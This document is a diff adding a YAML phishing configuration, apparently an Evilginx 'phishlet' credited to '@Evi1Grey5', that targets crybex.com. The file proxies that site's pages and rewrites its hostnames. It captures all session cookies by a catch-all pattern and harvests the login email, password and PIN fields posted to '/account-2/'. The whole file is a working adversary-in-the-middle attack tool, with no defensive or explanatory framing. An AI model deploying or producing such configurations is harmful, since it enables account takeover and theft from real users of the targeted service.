@@ -1,0 +1,43 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'crybex.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'crybex.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'images', orig_sub: 'images', domain: 'dmca.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'w', orig_sub: 'w', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.crybex.com', orig_sub: 'www', domain: 'crybex.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  - {triggers_on: 'crybex.com', orig_sub: '', domain: 'crybex.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  - {triggers_on: 'images.dmca.com', orig_sub: 'images', domain: 'dmca.com', search: 'https://{domain}', replace: 'https://{hostname_regexp}', mimes: ['text/html','application/xhtml+xml','application/xml','image/avif','image/webp','image/apng','application/signed-exchange','application/json','application/x-www-form-urlencoded','application/javascript']}
+  
+auth_tokens:
+  - domain: 'crybex.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.crybex.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+auth_urls:
+  - '/account-2/'
+
+credentials:
+  username:
+    key: 'logmail'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'user_pin'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'crybex.com'
+  path: '/'
+
